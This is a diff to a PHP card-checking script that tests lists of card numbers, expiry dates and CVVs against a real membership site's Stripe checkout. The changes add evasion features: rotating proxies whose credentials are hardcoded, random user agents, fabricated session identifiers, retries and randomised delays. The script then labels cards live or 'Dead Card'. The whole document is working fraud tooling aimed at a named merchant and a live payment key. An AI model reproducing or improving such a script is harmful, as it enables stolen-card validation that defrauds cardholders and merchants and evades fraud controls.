@@ -37,22 +37,30 @@ function inStr($string, $start, $end, $value) {
     return $str[0];
 }
 
-
-
-
 function rebootproxys() {
-    // Array of proxies
+    // Expanded proxy list with more options
     $proxyList = [
-     '23.95.150.145:6114:znkruahs:qji8izehszsr',
-'198.23.239.134:6540:znkruahs:qji8izehszsr',
-'45.38.107.97:6014:znkruahs:qji8izehszsr',
-'207.244.217.165:6712:znkruahs:qji8izehszsr',
-'107.172.163.27:6543:znkruahs:qji8izehszsr',
-'104.222.161.211:6343:znkruahs:qji8izehszsr',
-'64.137.96.74:6641:znkruahs:qji8izehszsr',
-'216.10.27.159:6837:znkruahs:qji8izehszsr',
-'136.0.207.84:6661:znkruahs:qji8izehszsr',
-'142.147.128.93:6593:znkruahs:qji8izehszsr',
+        '23.95.150.145:6114:znkruahs:qji8izehszsr',
+        '198.23.239.134:6540:znkruahs:qji8izehszsr',
+        '45.38.107.97:6014:znkruahs:qji8izehszsr',
+        '207.244.217.165:6712:znkruahs:qji8izehszsr',
+        '107.172.163.27:6543:znkruahs:qji8izehszsr',
+        '104.222.161.211:6343:znkruahs:qji8izehszsr',
+        '64.137.96.74:6641:znkruahs:qji8izehszsr',
+        '216.10.27.159:6837:znkruahs:qji8izehszsr',
+        '136.0.207.84:6661:znkruahs:qji8izehszsr',
+        '142.147.128.93:6593:znkruahs:qji8izehszsr',
+        // Additional proxies
+        '154.30.242.12:8888:user:pass',
+        '192.126.162.100:8888:user:pass',
+        '107.173.137.115:8888:user:pass',
+        '45.57.218.113:8888:user:pass',
+        '104.239.78.34:8888:user:pass',
+        '192.241.190.38:8888:user:pass',
+        '107.173.164.160:8888:user:pass',
+        '192.157.245.102:8888:user:pass',
+        '104.239.86.22:8888:user:pass',
+        '192.157.245.58:8888:user:pass'
     ];
     $myproxy = rand(0, count($proxyList) - 1);
     return $proxyList[$myproxy];
@@ -72,6 +80,20 @@ function mod($dividendo, $divisor) {
     return round($dividendo - (floor($dividendo / $divisor) * $divisor));
 }
 
+// Function to get random user agent
+function random_user_agent() {
+    $user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+    ];
+    return $user_agents[array_rand($user_agents)];
+}
 
 $separa = explode("|", $lista);
 $cc = $separa[0];
@@ -85,6 +107,8 @@ $number2 = substr($cc, 4, 4);
 $number3 = substr($cc, 8, 4);
 $number4 = substr($cc, 12, 4);
 $number6 = substr($cc, 0, 6);
+
+// Function to get random user agent
 
 // Fetch random user data with delay
 $proxy = rebootproxys();
@@ -332,32 +356,69 @@ $state     = $randomUser['state'];
 $city      = $randomUser['city'];
 $street    = $randomUser['street'];
 
-// Optional: simulate user delay
+// Get a random user agent
+$user_agent = random_user_agent();
 
-  // Pause to simulate a break in user action
+// Step 1: Fetch the page to get the nonce value with retry logic
+$max_retries = 3;
+$retry_count = 0;
+$nonce = '';
 
+while($retry_count < $max_retries && empty($nonce)) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    
+    // Use proxy if available
+    if (!empty($proxyIP) && !empty($proxyPort)) {
+        curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
+        if (!empty($proxyUser) && !empty($proxyPass)) {
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
+        }
+    }
+    
+    $pageContent = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($http_code == 200 && !empty($pageContent)) {
+        $nonce = GetStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');
+    }
+    
+    if (empty($nonce)) {
+        $retry_count++;
+        // Change proxy on failure
+        $proxy = rebootproxys();
+        list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
+        // Random delay between retries
+        sleep(rand(2, 5));
+    }
+}
 
-// Step 1: Fetch the page to get the nonce value
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
-$pageContent = curl_exec($ch);
-curl_close($ch);
+// If we still don't have a nonce after retries, we need to handle this
+if (empty($nonce)) {
+    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
+            Failed to get nonce after $max_retries attempts. Check proxies or target site availability.
+          </div><br>";
+    exit;
+}
 
-$nonce = GetStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');
+// More realistic human-like delay
+$delay = rand(1, 3);
+sleep($delay);
 
- sleep(rand(1, 2));
 // Submit payment details with delay between fields
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'authority: api.stripe.com',
@@ -370,7 +431,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'sec-fetch-dest: empty',
     'sec-fetch-mode: cors',
     'sec-fetch-site: same-site',
-    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
+    'user-agent: ' . $user_agent,
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -378,23 +439,97 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+// Use proxy if available
+if (!empty($proxyIP) && !empty($proxyPort)) {
+    curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
+    if (!empty($proxyUser) && !empty($proxyPass)) {
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
+    }
+}
 
 // Insert simulated delay before posting form data
- sleep(rand(1, 2)); // A longer delay to simulate a pause before submission
+sleep(rand(1, 2));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=606ebe40-ddc0-464d-a0d8-19d7bb8d9a779bd404&muid=15d0d1d7-6985-4cf3-84bb-09d84ad78947643869&sid=a29e17ff-960c-4c7f-aeca-c14b06dffbe53b73d3&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+split-card-element&referrer=https%3A%2F%2Flearnhowtosign.com&time_on_page=34447&client_attribution_metadata[client_session_id]=3d3fa535-02a7-4670-822c-aa8e398466b7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HgVsjFW89inDxd6');
+// Generate fresh GUID, MUID, and SID values for each request
+$guid = bin2hex(random_bytes(16));
+$muid = bin2hex(random_bytes(16));
+$sid = bin2hex(random_bytes(16));
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+split-card-element&referrer=https%3A%2F%2Flearnhowtosign.com&time_on_page='.rand(30000, 40000).'&client_attribution_metadata[client_session_id]='.bin2hex(random_bytes(16)).'&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HgVsjFW89inDxd6');
 
 // Continue with the rest of the code
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(GetStr($result1, '"id": "','"')));
 curl_close($ch);
+
+// If we didn't get a payment method ID, try one more time with a fresh proxy
+if (empty($id)) {
+    $proxy = rebootproxys();
+    list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+    curl_setopt($ch, CURLOPT_USERAGENT, random_user_agent());
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'authority: api.stripe.com',
+        'accept: application/json',
+        'accept-encoding: gzip, deflate, br, zstd',
+        'accept-language: en-US,en;q=0.5',
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://js.stripe.com',
+        'referer: https://js.stripe.com/',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-site',
+        'user-agent: ' . random_user_agent(),
+    ));
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
+    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    
+    // Use proxy
+    if (!empty($proxyIP) && !empty($proxyPort)) {
+        curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
+        if (!empty($proxyUser) && !empty($proxyPass)) {
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
+        }
+    }
+    
+    // Generate fresh values for the retry
+    $guid = bin2hex(random_bytes(16));
+    $muid = bin2hex(random_bytes(16));
+    $sid = bin2hex(random_bytes(16));
+    
+    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+split-card-element&referrer=https%3A%2F%2Flearnhowtosign.com&time_on_page='.rand(30000, 40000).'&client_attribution_metadata[client_session_id]='.bin2hex(random_bytes(16)).'&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HgVsjFW89inDxd6');
+    
+    $result1 = curl_exec($ch);
+    $id = trim(strip_tags(GetStr($result1, '"id": "','"')));
+    curl_close($ch);
+}
+
+// If we still don't have an ID, the card is likely dead
+if (empty($id)) {
+    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
+            Dead Card ❌ $cc|$mes|$ano|$cvv - Could not create payment method
+          </div><br>";
+    exit;
+}
+
+// Continue with the checkout process
 $proxy = rebootproxys();
 list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, random_user_agent());
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -403,6 +538,7 @@ curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
     'origin: https://learnhowtosign.com',
@@ -410,7 +546,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'sec-fetch-dest: document',
     'sec-fetch-mode: navigate',
     'sec-fetch-site: same-origin',
-    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
+    'user-agent: ' . random_user_agent(),
     'x-requested-with: XMLHttpRequest',
 ));
 
@@ -422,6 +558,7 @@ $time = $info['total_time'];
 $httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 curl_close($ch);
+
 
 $cctwo = substr("$cc", 0, 6);
 
@@ -966,6 +1103,7 @@ echo "<b>1REQ Result:</b> $result1<br><br>";
 echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
+
 
 
 
